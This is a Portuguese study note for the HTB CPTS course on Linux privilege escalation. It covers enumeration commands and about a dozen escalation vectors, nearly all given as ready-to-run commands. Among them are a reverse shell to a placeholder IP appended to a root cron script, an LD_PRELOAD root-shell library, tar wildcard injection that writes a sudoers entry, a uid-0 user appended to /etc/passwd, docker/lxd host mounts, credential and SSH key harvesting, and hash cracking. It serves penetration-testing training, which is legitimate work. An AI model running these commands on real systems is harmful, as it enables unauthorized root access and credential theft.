---
tema: Privilege Escalation
tópico: Linux Privilege Escalation — enumeração local e escalada para root
tags: [htb, cpts, privesc, linux, suid, sudo, capabilities, cron, kernel]
dificuldade: easy
---

# 🐧 CPTS 25 - Linux Privilege Escalation

> [!info] Objetivo
> Partindo de um shell de usuário comum (`www-data`, `htb`, `user`…), encontrar uma falha de configuração ou vulnerabilidade local que entregue **root**. A regra de ouro: **enumerar até doer** antes de tentar qualquer exploit. 90% das máquinas CTF/CPTS caem por má configuração (SUID, sudo, cron, credenciais), não por kernel exploit.

---

## 🎯 Quando usar

Use esta nota **imediatamente após** conseguir o primeiro shell e estabilizá-lo (ver [[CPTS 08 - Shells and Payloads]]).

| Situação | O que fazer primeiro |
|----------|----------------------|
| Acabei de ganhar shell | `id`, `uname -a`, `sudo -l`, `ss -tulpn`, shell estável |
| Enumeração manual não achou nada | Rodar **linpeas** + **pspy** em paralelo |
| Suspeita de binário incomum | `find / -perm -4000` → cruzar com **GTFOBins** |
| Host com NFS exportado | testar `no_root_squash` (quase sempre dá root) |
| Kernel muito antigo | linux-exploit-suggester + PwnKit/DirtyPipe |

> [!tip] Ordem de prioridade
> 1) **sudo** → 2) **SUID/SGID** → 3) **capabilities** → 4) **cron/processos** → 5) **credenciais e chaves** → 6) **containers/NFS** → 7) **kernel**. Kernel exploit é o **último** recurso (pode derrubar o host).

---

## 🧰 Ferramentas

| Ferramenta | Tipo | Uso rápido | Por que usar |
|-----------|------|-----------|--------------|
| **linpeas.sh** | 🔵 script | `./linpeas.sh -a \| tee linpeas.out` | Varre TODO o host e colore o que importa; o filtro mais rápido |
| **LinEnum** | 🔵 script | `./LinEnum.sh -t -s /tmp/out` | Saída enxuta, boa para hosts lentos |
| **linux-smart-enumeration (LSE)** | 🔵 script | `./lse.sh -l2 -i` | Níveis de verbosidade; ótimo para não poluir |
| **pspy64** | 🔵 binário | `./pspy64 -pf -i 1000` | Mostra processos/cron **sem root** — o olho que você não tem |
| **GTFOBins** | 🌐 site | https://gtfobins.github.io | Comandos prontos para SUID/sudo/capabilities por binário |
| **unix-privesc-check** | 🔵 script | `./unix-privesc-check standard` | Foco em permissões de arquivos de config |
| **linux-exploit-suggester** | 🔵 script | `./les.sh` | Cruza kernel/CVE/OS e sugere exploits |
| **SearchSploit** | 🟢 local DB | `searchsploit linux kernel 4.4 --id` | Achar PoC offline por versão |
| **WinPEAS/LinPEAS release** | 🔵 | `curl`/`wget` do repo PEASS-ng | Versão sempre atualizada |
| **traitor** | 🔵 binário | `./traitor -a` | Explora vetores comuns automaticamente (cuidado: barulhento) |

> [!warning] Não confie só em automação
> linpeas **mostra** o vetor, mas não o explora. Você ainda precisa entender o "porquê" daquela permissão ser perigosa. Em ambientes reais, exploits automatizados do linpeas derrubam serviços.

---

## 🧭 Enumeração manual (faça SEMPRE, antes da automação)

### Sistema e identidade

```bash
# 🟢 Quem sou, em que grupo estou (grupos docker/lxd/disk/adm já são root na prática)
id
whoami
groups

# 🟢 Kernel, distro e arquitetura (decide se vale kernel exploit)
uname -a
cat /etc/os-release
cat /proc/version
arch

# 🟢 Hostname, usuários locais e quem tem shell válido
hostname
cat /etc/passwd | grep -v nologin
cat /etc/shadow 2>/dev/null        # só se tiver permissão → já é meio caminho

# 🟢 Rede e o que roda localmente (serviços em 127.0.0.1 = minas de ouro)
ip a; ip route
ss -tulpn
netstat -antup 2>/dev/null
```

### Sudo — o vetor #1

```bash
# 🟢 A flag mais importante do host: o que EU posso rodar como root
sudo -l

# Detalhes que importam na saída:
#   (ALL : ALL) ALL                  → root total
#   (root) NOPASSWD: /usr/bin/xxd     → binário específico sem senha → GTFOBins
#   env_keep+=LD_PRELOAD / LD_LIBRARY_PATH → sequestro de biblioteca
#   Cmnd_Alias, SETENV, NOEXEC         → comportamento muda o ataque

# 🟢 Versão do sudo (CVE-2019-14287 "*", CVE-2021-3156 Baron Samedit)
sudo --version

# 🟢 Se a senha do meu usuário é conhecida, testar sudo com senha
sudo -S id <<< '<SENHA>'
```

> [!tip] Sudo + binário conhecido
> Copie o nome do binário em https://gtfobins.github.io/#+sudo. Cada entrada lista o comando exato (ex.: `sudo vim -c ':!/bin/sh'`). **Nunca digite de cabeça** — variações de versão mudam a sintaxe.

### Processos, agendamentos e permissões

```bash
# 🟢 Processos rodando como root (linha de comando completa, path dos binários)
ps aux
ps -eo pid,user,cmd --sort=start_time

# 🟢 Tarefas agendadas: cron de sistema e de usuário
cat /etc/crontab
ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.*/ 2>/dev/null
crontab -l
cat /var/spool/cron/crontabs/* 2>/dev/null

# 🟢 Arquivos com bit SUID/SGID (dois filtros: um rápido, um completo)
find / -perm -4000 -type f 2>/dev/null        # SUID
find / -perm -2000 -type f 2>/dev/null        # SGID
find / -perm -4000 -o -perm -2000 2>/dev/null # ambos

# 🟢 Diretórios/arquivos que EU posso escrever (onde plantar o ataque)
find / -writable -type d 2>/dev/null | grep -v -E '^/(proc|sys)'
find / -perm -o+w -type f 2>/dev/null | grep -v -E '^/(proc|sys)'

# 🟢 Capabilities (mais silencioso que SUID e muito esquecido)
getcap -r / 2>/dev/null
```

---

## 🔍 Automação (depois do manual)

```bash
# 🐧 Do atacante: subir os scripts (ver CPTS 07 - File Transfers)
python3 -m http.server 80

# 🐧 No alvo: baixar, dar permissão e rodar
wget http://<IP>/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh -a 2>/dev/null | tee /tmp/linpeas.out

# 🐧 LSE com dois níveis: -l2 mostra achados prováveis, -i interativo
./lse.sh -l2 -i

# 🐧 pspy: monitora cron/processos de outros usuários SEM precisar de root
./pspy64 -pf -i 1000        # -p processos, -f arquivos, -i intervalo em ms

# 🐧 Sugestor de kernel exploit com base no OS detectado
./les.sh
```

---

## 🚪 Vetores de escalada (do mais comum ao mais raro)

### 1. SUID / SGID + GTFOBins

```bash
# 🟢 Um binário SUID roda com os privilégios do DONO (root). Se ele executa comandos
#    arbitrários (shell, leitura/escrita de arquivo), vira root.

# Exemplos clássicos de SUID "presente" que a máquina entrega:
#   /usr/bin/find            → find . -exec /bin/sh -p \; -quit
#   /usr/bin/vim, nano       → editor → :!/bin/sh
#   /usr/bin/bash            → bash -p   (ou bash -c 'id')
#   /usr/bin/nmap            → nmap --interactive → !sh   (nmap antigo)
#   /usr/bin/python3         → python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
#   /usr/bin/env             → env /bin/sh -p
#   /usr/bin/cp, mv          → sobrescrever /etc/passwd ou /etc/shadow

# 🟢 Confirmar se o binário preserva privilégios e usa o -p corretamente
ls -l /usr/bin/bash
/bin/bash -p
```

> [!tip] SGID
> SGID herda o **grupo** do dono. Um SGID de `docker`, `adm` ou `shadow` já é escalada — leia arquivos do grupo (`/etc/shadow` via grupo `shadow`) ou use o grupo para pivotar.

### 2. Sudo mal configurado

```bash
# 🟢 Binário específico com NOPASSWD → GTFOBins seção Sudo
sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}'
sudo /usr/bin/perl -e 'exec "/bin/sh"'
sudo /usr/bin/less /etc/hosts      # dentro do less: !/bin/sh
sudo /usr/bin/find /tmp -exec /bin/sh \; -quit

# 🟢 sudo com LD_PRELOAD liberado (env_keep+=LD_PRELOAD) — compile antes, no alvo,
#    com a MESMA arquitetura e libc:
cat > /tmp/pe.c <<'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
__attribute__((constructor)) void pwn(void){
    setuid(0); setgid(0); system("/bin/bash -p");
}
EOF
gcc -fPIC -shared -o /tmp/pe.so /tmp/pe.c
sudo LD_PRELOAD=/tmp/pe.so <qualquer_comando_do_sudo_l>

# 🟢 sudo com LD_LIBRARY_PATH permitido → sequestrar uma lib que o binário carrega
ldd /usr/bin/<binario>             # achar libs carregadas
# compilar lib falsa com o nome de uma lib real e sobrescrever via LD_LIBRARY_PATH

# 🟢 CVE-2019-14287: sudo <1.8.28 com "ALL, !root" → burlar com ""
sudo -u#-1 /bin/bash               # ou: sudo -u#4294967295 id
```

### 3. Capabilities

```bash
# 🟢 getcap revela poderes parciais. Combinar com GTFOBins seção "Capabilities".
getcap -r / 2>/dev/null

# cap_setuid+ep em python/perl → virar root direto
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

# cap_dac_read_search+ep em tar/qualquer → ler /etc/shadow e qualquer arquivo
tar -czf /tmp/shadow.tgz /etc/shadow && tar -xzf /tmp/shadow.tgz -C /tmp

# cap_sys_admin+ep → mount de filesystem próprio (ex.: liberar /etc/passwd)
```

### 4. Cron e processos agendados

```bash
# 🟢 Cron roda como root. Se o SCRIPT ou o DIRETÓRIO que ele chama é gravável, você é root.

# 1) Ver o agendamento e o que ele executa
cat /etc/crontab
ls -la /etc/cron.d/; cat /etc/cron.d/*

# 2) Checar permissões do script e de todo o caminho
ls -la /opt/backup.sh
namei -l /opt/backup.sh

# 3) Se o script for gravável → injetar reverse shell
echo 'bash -i >& /dev/tcp/<IP>/<PORTA> 0>&1' >> /opt/backup.sh
# 🐧 atacante: nc -lvnp <PORTA>

# 4) pspy mostra o comando exato do cron, mesmo sem permissão de leitura do crontab
./pspy64 -pf -i 1000
```

#### Wildcard injection (tar/rsync/7z/chown)

```bash
# 🟢 Se o cron roda "tar czf /tmp/bkp.tar.gz *" ou similar dentro de um diretório
#    gravável, os nomes de arquivo viram ARGUMENTOS. Criar arquivos com nome de flag:
cd /diretorio_gravavel
echo 'echo "www-data ALL=(root) NOPASSWD:ALL" >> /etc/sudoers' > shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
# O tar lê esses "arquivos" como opções e executa shell.sh como root.
```

### 5. PATH hijacking

```bash
# 🟢 Script SUID ou cron que chama um binário SEM caminho absoluto (ex.: "ps", "cat",
#    "uname") usa o PATH. Prependando um diretório gravável, plantamos um falso binário.

strings /usr/local/bin/suid_bin | grep -Ei 'cp|cat|ps|ls'   # procura chamadas relativas
mkdir -p /tmp/pwn
echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/pwn/nomechamado
chmod +x /tmp/pwn/nomechamado
export PATH=/tmp/pwn:$PATH
/usr/local/bin/suid_bin        # executa nosso falso binário como root
```

### 6. LD_PRELOAD / LD_LIBRARY_PATH (fora do sudo)

```bash
# 🟢 Vale quando o binário SUID tem o bit preservado E o loader respeita a var
#    (binários SUID normalmente ignoram LD_PRELOAD — por isso o vetor clássico é via sudo).
echo $LD_PRELOAD $LD_LIBRARY_PATH
# Se um cron/script root chamar binário normal (não SUID) com env controlada, a lib roda como root.
```

### 7. NFS com `no_root_squash`

```bash
# 🟢 Se um export NFS tem no_root_squash, root no cliente É root no servidor.
# 1) Descobrir exports
showmount -e <IP>
# Export listing:
# /srv/share  *(rw,sync,no_root_squash,no_all_squash)

# 2) Montar e criar um binário SUID — ele nasce root:root no alvo
mkdir -p /mnt/nfs && sudo mount -t nfs <IP>:/srv/share /mnt/nfs
sudo cp /bin/bash /mnt/nfs/rootbash
sudo chmod +s /mnt/nfs/rootbash

# 3) No alvo (shell comum), executar preservando privilégios
/srv/share/rootbash -p
```

### 8. Grupos perigosos (docker, lxd, disk, adm)

```bash
# 🟢 Pertencer ao grupo docker = root (monta o / do host dentro do container)
docker images
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# 🟢 Grupo lxd/lxc: criar container "privileged" e montar o host
lxc image import ./alpine.tar.gz --alias img
lxc init img privesc -c security.privileged=true
lxc config device add privesc hostroot disk source=/ path=/mnt/root recursive=true
lxc start privesc && lxc exec privesc /bin/sh   # /mnt/root é o / do host

# 🟢 Grupo disk: ler o disco cru com debugfs
debugfs /dev/sda1
debugfs: cat /etc/shadow
```

### 9. Credenciais, histórico e chaves SSH

```bash
# 🟢 O vetor mais "real": achar senha/segredo e virar outro usuário.
# Histórico de shell dos usuários
cat ~/.bash_history; cat /home/*/.bash_history 2>/dev/null
cat ~/.zsh_history

# Arquivos de config que costumam guardar senhas
grep -rEi 'pass=|password|secret|token|api_key' /var/www /opt /home /etc 2>/dev/null
cat /var/www/html/wp-config.php 2>/dev/null
cat ~/.my.cnf ~/.netrc ~/.git-credentials 2>/dev/null
ls -la ~/.ssh; cat ~/.ssh/id_rsa 2>/dev/null; cat ~/.ssh/known_hosts
find / -name 'id_rsa' -o -name '*.pem' -o -name '*.key' 2>/dev/null

# 🟢 Chave privada encontrada: logar no próprio host ou em outro com o mesmo usuário
chmod 600 id_rsa
ssh -i id_rsa <USUARIO>@<IP>

# 🟢 Backup de /etc/passwd + /etc/shadow → quebrar hash offline
unshadow passwd.bak shadow.bak > unshadowed.txt
john --wordlist=~/wordlists/rockyou.txt unshadowed.txt
hashcat -m 1800 hashes.txt ~/wordlists/rockyou.txt      # sha512crypt
```

### 10. Arquivos críticos graváveis

```bash
# 🟢 /etc/passwd gravável → criar usuário root com senha conhecida
openssl passwd -1 -salt pwn '<SENHA>'
echo 'pwn:<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd
su pwn

# 🟢 /etc/shadow gravável → trocar o hash do root
openssl passwd -6 '<SENHA>'
# substituir o campo do root pela hash gerada e logar: su root
```

### 11. screen / tmux

```bash
# 🟢 Sessão de root mal configurada ou binário SUID vulnerável
screen -ls                     # sessões ativas; se listar o root, tentar reconectar
screen -x root/<pid>           # anexar à sessão alheia (permissões frouxas)
screen -r root/<pid>

# 🟢 screen com SUID e versão 4.5.0 → CVE-2017-5618 (Logfile gravável → escrever em
#    /etc/ld.so.preload e carregar lib nossa como root). PoC: exploit-db 41154
screen --version
ls -l $(command -v screen)     # -rwsr-xr-x → SUID presente
# fluxo do PoC: compilar libhax.so + rootshell.c, usar -Logfile para instalar a lib em
# /etc/ld.so.preload e executar screen de novo → loader carrega a lib como root.
```

### 12. logrotate e wildcards em logs

```bash
# 🟢 logrotate (roda como root pelo cron) com "su" ausente + diretório de log gravável
cat /etc/logrotate.d/*                 # procurar diretório do log
ls -ld /var/log/<dir>                  # gravável?
# PoC clássico: logrotten (CVE-2022-... família logrotate): o logrotate troca o arquivo
# e escreve como root → escrever em /etc/bash_completion.d/ ou ~root/.ssh/authorized_keys
```

### 13. Kernel exploits (último recurso)

```bash
# 🟢 Só usar depois de esgotar config. Risco de panic/kernel crash no alvo.
uname -r
cat /etc/os-release

# PwnKit — pkexec (polkit) SUID, afeta praticamente todas as distros com polkit < 0.120
# CVE-2021-4034: explorar pkexec para rodar código como root.
ls -l /usr/bin/pkexec
# compilar/usar PoC público (ex.: PwnKit do Qualys) e executar → root

# DirtyPipe — kernel 5.8 até 5.16.x, CVE-2022-0847: sobrescrever arquivos read-only
# (ex.: injetar uma chave/trocar SUID em /usr/bin/su) a partir de qualquer usuário.
uname -r
# PoC público "dirtypipe" → escrever em /etc/passwd ou hijack de binário SUID

# Dirty COW — CVE-2016-5195 (kernels < 4.8.3): race condition de copy-on-write.
searchsploit dirty cow
```

> [!warning] Ao rodar kernel exploit
> Tome snapshot da VM, nunca rode às cegas em produção, e confira na saída do `searchsploit`/PoC se OS e kernel batem. Um panic apaga o uptime e entrega o teste.

---

## 🗺️ Tabela achado → exploração

| Achado na enumeração | Comando/ação de escalada |
|----------------------|--------------------------|
| `sudo -l` → binário NOPASSWD | GTFOBins seção **sudo** (ex.: `sudo vim -c ':!/bin/sh'`) |
| `env_keep+=LD_PRELOAD` no sudo | compilar `.so` com `constructor` → `sudo LD_PRELOAD=...` |
| SUID incomum | GTFOBins seção **SUID** |
| `getcap` com `cap_setuid+ep` | `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'` |
| `cap_dac_read_search+ep` | ler `/etc/shadow`, `/root/` |
| Script de cron gravável | injetar reverse shell no script |
| Cron com `tar ... *` em dir gravável | `--checkpoint-action=exec=sh shell.sh` |
| Script SUID chamando binário sem path | PATH hijacking |
| Export NFS `no_root_squash` | criar `rootbash` SUID e executar com `-p` |
| Grupo `docker` | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` |
| Grupo `lxd` | container `privileged` + mount do `/` |
| `/etc/passwd` gravável | `openssl passwd -1` + append de usuário uid 0 |
| Chave `id_rsa` encontrada | `ssh -i id_rsa <USUARIO>@<IP>` |
| Senha em `bash_history`/config | `su <USUARIO>` / reuso em SSH |
| `screen` SUID 4.5.0 | CVE-2017-5618 (exploit-db 41154) |
| Kernel 5.8–5.16 | DirtyPipe CVE-2022-0847 |
| `pkexec` SUID (polkit antigo) | PwnKit CVE-2021-4034 |
| Serviço local em `127.0.0.1` | tunnel (ver [[CPTS 12 - Pivoting, Tunneling, and Port Forwarding]]) |

---

## ⚠️ Pegadinhas

- 🕳️ **Shell não é root, mas parece:** rode `id` depois de cada SUID/sudo. `bash` sem `-p` **derruba** o privilégio.
- 🕳️ **Baixar ferramenta = deixar rastro.** Prefira `/dev/shm` e `/tmp`; apague depois.
- 🕳️ **linpeas no host errado.** Confirme `hostname`/IP antes de anotar evidência.
- 🕳️ **Kernel exploit primeiro = host caído.** Deixe por último, sempre.
- 🕳️ **GTFOBins desatualizado:** o comando muda com a versão (ex.: `vim`, `find`, `awk`). Teste local antes.
- 🕳️ **`sudo -l` exige senha:** se você não tem a senha, o vetor sudo está fechado (a menos que haja CVE de sudo).
- 🕳️ **Cron a cada 5 min:** espere o ciclo (use `pspy`) em vez de assumir que o payload falhou.
- 🕳️ **SUID em script = inútil:** o kernel ignora SUID em `#!` — só funciona em binário compilado.
- 🕳️ **NFS montado no alvo, não em você:** monte do seu host atacante; fazer `cp` **dentro** do alvo não dá SUID root.
- 🕳️ **`no_root_squash` ausente ≠ fechado:** teste; `all_squash` mapeia para `nfsnobody`.

---

## ✅ Checklist rápido

- [ ] Shell estabilizado (`python3 -c 'pty.spawn("/bin/bash")'` / `script`)
- [ ] `id`, `uname -a`, `hostname`, `cat /etc/os-release`
- [ ] `sudo -l` lido linha a linha e cruzado com GTFOBins
- [ ] `find / -perm -4000` e `-2000` revisados (sem falsos positivos de pacote)
- [ ] `getcap -r /` revisado
- [ ] `crontab -l` + `/etc/cron.*` + `pspy64` rodando alguns minutos
- [ ] Diretórios e scripts graváveis pelo meu usuário identificados
- [ ] `ss -tulpn`: serviços locais anotados
- [ ] Histórico, configs web e chaves SSH varridos por credenciais
- [ ] `/etc/passwd` e `/etc/shadow` testados quanto a escrita
- [ ] Grupos perigosos (`docker`, `lxd`, `disk`, `adm`) checados
- [ ] linpeas + LSE executados e saída **salva**
- [ ] NFS exportado testado (`showmount -e <IP>`)
- [ ] Kernel CVEs avaliados por último (PwnKit / DirtyPipe)
- [ ] `id` confirmando `uid=0(root)` e evidência capturada (screenshot/`proof.txt`)

---

## 🔗 Relacionado

- [[Fase 10 - Privilege Escalation]] — checklist de fase e contexto do engajamento
- [[CPTS 26 - Windows Privilege Escalation]] — o equivalente no Windows
- [[CPTS 07 - File Transfers]] — como levar linpeas/pspy para o alvo
- [[CPTS 08 - Shells and Payloads]] — shell estável antes de escalar
- [[CPTS 10 - Password Attacks]] — quebrar hashes do `/etc/shadow` e credenciais reusadas
